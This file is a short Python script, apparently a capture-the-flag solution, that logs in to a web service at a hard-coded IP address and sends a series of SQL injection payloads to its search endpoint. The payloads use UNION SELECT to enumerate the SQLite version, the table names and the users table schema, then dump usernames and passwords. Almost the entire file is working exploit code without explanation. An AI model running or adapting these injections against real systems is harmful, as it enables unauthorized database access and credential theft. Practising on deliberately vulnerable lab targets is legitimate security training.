import requests
import urllib.parse
import string

base_url = "http://62.173.140.174:36100/login"
data = {
    "username": "admin",
    "password": "flag_codeby_1og25ka9psv4as"
}

session = requests.Session()
response = session.post(base_url, data=data)
print("response = ", response)
print(response.content.decode('utf-8'))


search_url = "http://62.173.140.174:36100/search"
#code = "sql"
code = "' UNION SELECT NULL,NULL,sqlite_version(),NULL,NULL--"
code = "' UNION SELECT NULL,NULL,name,NULL,NULL FROM sqlite_master WHERE type='table'--"
code = "' UNION SELECT NULL,NULL,name,sql,NULL FROM sqlite_master WHERE name='users'--"
code = "' UNION SELECT NULL,NULL,username,password,NULL FROM users--"
url = f"{search_url}?q={urllib.parse.quote(code)}"
print(url)
#response_1 = requests.get(url, allow_redirects=False)
response_1 = session.get(url, allow_redirects=False)
print("response_1 = ", response_1)
print("responseeee = ", response_1.content.decode('utf-8'))

